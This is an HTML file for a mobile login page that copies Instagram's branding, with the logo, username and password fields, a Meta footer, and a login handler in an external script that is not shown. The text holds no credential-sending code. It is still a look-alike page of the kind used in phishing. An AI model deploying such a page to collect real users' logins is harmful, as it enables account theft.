<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="mobile-frame">
        <header class="header">
            <button class="back-btn">&#8592;</button>
            <div class="language-dropdown">
                English (US) <span class="arrow-down">&#9662;</span>
            </div>
        </header>

        <main class="login-wrapper">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Logo" class="main-logo">

            <div class="input-container">
                <input type="text" id="username" placeholder="Username, email or mobile number">
                
                <div class="password-wrapper">
                    <input type="password" id="password" placeholder="Password">
                    <span class="toggle-eye" onclick="togglePassword()">
                        <svg id="eye-icon" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#8a8a8a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </span>
                </div>
            </div>

            <div id="error-message"></div>

            <button class="log-in-btn" onclick="handleLogin()">Log in</button>
            
            <a href="#" class="forgot-link">Forgot password?</a>
        </main>

        <footer class="footer">
            <button class="create-account-btn">Create new account</button>
            <div class="meta-logo"><strong>&infin;</strong> Meta</div>
        </footer>
    </div>

    <script src="script.js"></script>
</body>
</html>
